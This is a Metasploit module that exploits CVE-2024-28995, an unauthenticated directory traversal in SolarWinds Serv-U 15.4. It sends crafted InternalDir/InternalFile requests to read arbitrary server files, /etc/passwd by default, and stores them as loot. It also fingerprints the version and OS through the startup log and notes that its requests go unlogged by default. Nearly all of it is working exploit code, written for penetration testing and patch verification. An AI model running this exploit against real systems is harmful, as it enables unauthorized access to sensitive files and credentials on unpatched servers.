##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SolarWinds Serv-U Unauthenticated Arbitrary File Read',
        'Description' => %q{
          This module exploits an unauthenticated file read vulnerability, due to directory traversal, affecting
          SolarWinds Serv-U FTP Server 15.4, Serv-U Gateway 15.4, and Serv-U MFT Server 15.4. All versions prior to
          the vendor supplied hotfix "15.4.2 Hotfix 2" (version 15.4.2.157) are affected.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7', # MSF Module & Rapid7 Analysis
          'Hussein Daher' # Original finder
        ],
        'References' => [
          ['CVE', '2024-28995'],
          ['URL', 'https://www.solarwinds.com/trust-center/security-advisories/cve-2024-28995'],
          ['URL', 'https://attackerkb.com/topics/2k7UrkHyl3/cve-2024-28995/rapid7-analysis']
        ],
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          # There are no side effects I could determine. By default there is no logging enabled by Serv-U, and in
          # testing I was not able to enable logging such that any of the exploits requests were actually logged. If
          # a reverse proxy/gateway is in place that will likely be able to log attacker requests, but that is not a
          # default setup.
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptBool.new('STORE_LOOT', [false, 'Store the target file as loot', true]),
        OptString.new('TARGETURI', [true, 'The base URI path to the web application', '/']),
        OptString.new('TARGETFILE', [true, 'The full path of a target file to read.', '/etc/passwd']),
        OptInt.new('PATH_TRAVERSAL_COUNT', [true, 'The number of double dot (..) path segments needed to traverse to the root folder.', 4]),
      ]
    )
  end

  def check
    # We try to leverage the vulnerability and read the file `Serv-U-StartupLog.txt` from the default location in
    # a default install on both Linux and Windows. If successful, we can pull out the Serv-U version number and the
    # OS version. By default, the location of the `Serv-U-StartupLog.txt` file is
    # `C:\ProgramData\RhinoSoft\Serv-U\Serv-U-StartupLog.txt` on Windows, and `/usr/local/Serv-U/Serv-U-StartupLog.txt`
    # on Linux.
    default_paths = [
      '\\..',
      '/../../../../ProgramData/RhinoSoft/Serv-U'
    ]

    default_paths.each do |default_path|
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(datastore['TARGETURI']),
        'vars_get' => {
          'InternalDir' => default_path,
          'InternalFile' => 'Serv-U-StartupLog.txt'
        }
      )

      return Msf::Exploit::CheckCode::Unknown('Connection failed') unless res

      next unless res.code == 200

      version = res.body.match(/Serv-U.+Version.+\(([\d+.]{1,})\)/)

      next unless version

      os = res.body.match(/Operating System:\s+(.+)/)

      return Msf::Exploit::CheckCode::Vulnerable("SolarWinds Serv-U version #{version[1]} (#{os.nil? ? 'Unknown OS' : os[1]})")
    end

    Msf::Exploit::CheckCode::Safe
  end

  def run
    if datastore['TARGETFILE'].start_with? '/'
      native_path_sep = '/'
      target_path_sep = '\\'
      target_filepath = datastore['TARGETFILE']
    elsif datastore['TARGETFILE'][1, 3] == ':\\\\'
      native_path_sep = '\\'
      target_path_sep = '/'
      target_filepath = datastore['TARGETFILE'][3..]
    else
      fail_with(Failure::BadConfig, 'Ensure the TARGETFILE path starts with / for a Linux target, and C:\\\\ for a Windows target.')
    end

    # On Windows, the default install directory is: C:\ProgramData\RhinoSoft\Serv-U\
    # On Linux, the default install directory is: /usr/local/Serv-U/
    # The Serv-U service, will read files from the Client  directory, so /usr/local/Serv-U/Client/ on Linux
    # and C:\ProgramData\RhinoSoft\Serv-U\Client\ on Windows.
    # Therefore to leverage the directory traversal and navigate to the root folder on either platform will require
    # 4 double dot path segments.
    # We expose PATH_TRAVERSAL_COUNT to the user in case they are targeting a non default install location.
    path_traversal = "#{target_path_sep}.." * datastore['PATH_TRAVERSAL_COUNT']

    last_sep_pos = target_filepath.rindex(native_path_sep)

    fail_with(Failure::BadConfig, 'Could not locate a path separator in the TARGETFILE path') unless last_sep_pos

    if last_sep_pos == 0
      internal_dir = ''
    else
      internal_dir = target_filepath[0..last_sep_pos - 1].gsub(native_path_sep, target_path_sep)
    end

    internal_file = target_filepath[last_sep_pos + 1..]

    print_status("Reading file #{datastore['TARGETFILE']}")

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'vars_get' => {
        'InternalDir' => path_traversal << internal_dir,
        'InternalFile' => internal_file
      }
    )

    fail_with(Failure::UnexpectedReply, 'Connection failed') unless res

    fail_with(Failure::UnexpectedReply, "Unexpected response from server. HTTP code #{res.code}.") unless res.code == 200

    if datastore['STORE_LOOT']
      print_status('Storing the file data to loot...')

      store_loot(
        internal_file,
        res.body.ascii_only? ? 'text/plain' : 'application/octet-stream',
        datastore['RHOST'],
        res.body,
        datastore['TARGETFILE'],
        'File read from SolarWinds Serv-U server'
      )
    else
      print_line(res.body)
    end
  end

end
